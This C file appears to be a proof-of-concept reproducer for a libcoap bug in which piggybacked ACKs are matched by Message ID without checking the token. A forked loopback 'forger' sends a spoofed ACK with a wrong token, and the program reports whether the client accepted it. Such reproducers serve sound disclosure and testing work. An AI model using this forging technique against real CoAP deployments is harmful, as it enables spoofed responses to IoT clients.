/* libcoap matches a piggybacked ACK to its request by Message ID alone and does
 * not check the token. RFC 7252 5.3.2 requires both the Message ID and the
 * token to match. A forged ACK reusing the request's Message ID but carrying a
 * different token is delivered to the application as a matched response.
 *
 * build:
 *   cc token-spoof-repro.c -I<libcoap>/include \
 *      <libcoap>/.libs/libcoap-3-notls.a -o repro
 * run:
 *   ./repro            (exit 0 = reproduced)
 */
#define _DEFAULT_SOURCE
#include <arpa/inet.h>
#include <coap3/coap.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/wait.h>
#include <unistd.h>

#define PORT 5685

/* Reply to the client's request with an ACK that reuses its Message ID
 * (bytes 2-3) but carries a different token. */
static void forger(void) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);

  struct sockaddr_in me = {.sin_family = AF_INET,
                           .sin_port = htons(PORT),
                           .sin_addr.s_addr = htonl(INADDR_LOOPBACK)};

  bind(fd, (struct sockaddr *)&me, sizeof(me));

  uint8_t in[256];
  struct sockaddr_in cli;
  socklen_t len = sizeof(cli);
  recvfrom(fd, in, sizeof(in), 0, (struct sockaddr *)&cli, &len);

  uint8_t ack[] = {0x64,         /* ver 1, type ACK, TKL 4 */
                   0x45,         /* 2.05 Content */
                   in[2], in[3], /* Message ID copied from the request */
                   0x23,     0,     0,   0, /* token (request used DE AD BE EF) */
                   0xFF,  's',   'p', 'o', 'o', 'f'};
  sendto(fd, ack, sizeof(ack), 0, (struct sockaddr *)&cli, len);
  close(fd);
}

static int vulnerable = 0;

static coap_response_t on_response(coap_session_t *session,
                                   const coap_pdu_t *sent,
                                   const coap_pdu_t *rcvd,
                                   const coap_mid_t mid) {
  coap_bin_const_t tok = coap_pdu_get_token(rcvd);
  printf("[client] response: matched_request=%s  delivered_token=",
         sent ? "YES" : "no");
  for (size_t i = 0; i < tok.length; i++)
    printf("%02X", tok.s[i]);

  printf("  (request token was DEADBEEF)\n");

  if (sent)
    vulnerable = 1;

  (void)session;
  (void)mid;

  return COAP_RESPONSE_OK;
}

int main(void) {
  if (fork() == 0) {
    forger();
    _exit(0);
  }

  usleep(200 * 1000); /* let the forger bind before the client sends */

  coap_startup();
  printf("%s\n", coap_package_version());

  coap_context_t *ctx = coap_new_context(NULL);

  coap_address_t dst;
  coap_address_init(&dst);
  dst.addr.sin.sin_family = AF_INET;
  dst.addr.sin.sin_port = htons(PORT);
  dst.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  coap_session_t *session =
      coap_new_client_session(ctx, NULL, &dst, COAP_PROTO_UDP);
  coap_register_response_handler(ctx, on_response);

  coap_pdu_t *pdu =
      coap_new_pdu(COAP_MESSAGE_CON, COAP_REQUEST_CODE_GET, session);

  coap_add_token(pdu, 4, (const uint8_t *)"\xDE\xAD\xBE\xEF");
  coap_add_option(pdu, COAP_OPTION_URI_PATH, 4, (const uint8_t *)"test");
  coap_send(session, pdu);

  for (int i = 0; i < 100 && !vulnerable; i++)
    coap_io_process(ctx, 50 /* ms */);

  coap_session_release(session);
  coap_free_context(ctx);
  coap_cleanup();
  wait(NULL);

  puts(vulnerable ? "VULNERABLE: wrong-token piggybacked ACK accepted as a "
                    "match (RFC 7252 5.3.2)"
                  : "not reproduced");
  return vulnerable ? 0 : 1;
}
